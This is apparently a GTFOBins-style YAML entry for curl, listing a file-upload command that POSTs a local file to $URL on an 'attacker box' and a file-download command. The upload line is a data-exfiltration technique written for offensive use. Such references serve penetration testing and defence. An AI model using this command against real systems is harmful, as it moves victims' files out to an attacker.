---
functions:
  file-upload:
    - description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.
      code: |
        curl -X POST -d "@$LFILE" $URL
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        curl $URL -o $LFILE
---
